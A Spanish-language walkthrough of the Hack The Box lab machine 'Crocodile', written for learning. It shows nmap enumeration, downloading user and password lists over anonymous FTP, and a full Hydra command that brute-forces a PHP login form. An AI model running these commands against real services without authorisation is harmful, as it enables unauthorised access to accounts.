---
title: "Crocodile: FTP, fuerza bruta y login web"
description: "Máquina de Starting Point: extracción de listas por FTP anónimo, análisis de un formulario PHP y fuerza bruta controlada con Hydra."
category: "laboratorios"
draft: false
---

**Plataforma:** Hack The Box (Starting Point) · **SO:** Linux (Ubuntu) · **Dificultad:** Fácil

## Resumen

El FTP anónimo expone listas de usuarios y contraseñas. Con esas listas, y un análisis cuidadoso de la respuesta del formulario web, se encuentra una combinación válida.

## 1. Enumeración de servicios

```bash
nmap -sC -sV -Pn <IP>
```

Se identifica vsftpd 3.0.3 en el puerto 21, con acceso anónimo.

## 2. Descargar las listas por FTP

```bash
ftp <IP>
```

Usuario `anonymous`, sin contraseña. Dentro de la sesión:

```
ls
get allowed.userlist
get allowed.userlist.passwd
```

## 3. Revisar las listas

```bash
cat allowed.userlist
cat allowed.userlist.passwd
ls -l allowed.userlist allowed.userlist.passwd
wc -l allowed.userlist allowed.userlist.passwd
```

- `cat` muestra el contenido.
- `ls -l` confirma que los archivos existen y sus permisos.
- `wc -l` cuenta las líneas. Cada archivo tiene cuatro.

## 4. Analizar el sitio web

```bash
curl -i http://<IP>/login.php
```

Respuesta HTTP 200, Apache 2.4.41 en Ubuntu y un formulario de login PHP.

Guardá el HTML para compararlo después:

```bash
curl -s http://<IP>/login.php -o login.html
```

## 5. Encontrar el indicador de error

Enviá datos falsos al formulario:

```bash
curl -s -i -X POST -d 'Username=usuario_falso&Password=clave_falsa&Submit=Login' http://<IP>/login.php
curl -s -X POST -d 'Username=usuario_falso&Password=clave_falsa&Submit=Login' http://<IP>/login.php -o respuesta.html
```

Comparar las dos páginas:

```bash
diff -u login.html respuesta.html
```

La diferencia muestra el mensaje `Warning! Incorrect information..`. Ese texto es el indicador de login fallido que usa Hydra.

## 6. Fuerza bruta con Hydra

```bash
hydra -L allowed.userlist -P allowed.userlist.passwd <IP> http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect information."
```

- `-L` y `-P`: listas de usuarios y contraseñas.
- `http-post-form`: módulo para formularios POST.
- `F=`: texto que aparece cuando el login falla.

Hydra reporta una combinación válida para el usuario `admin`.

## 7. Validar el acceso

Iniciá sesión en `http://<IP>/login.php` con las credenciales encontradas. Ahí aparece el contenido protegido con la evidencia.

## Aprendizaje

- Una mala configuración (FTP anónimo) puede exponer información que después sirve para atacar otro servicio.
- Antes de lanzar fuerza bruta, hay que entender cómo responde la aplicación cuando el login falla.
- Las listas de contraseñas conocidas y reutilizadas son un riesgo real: se deben usar contraseñas únicas y robustas.
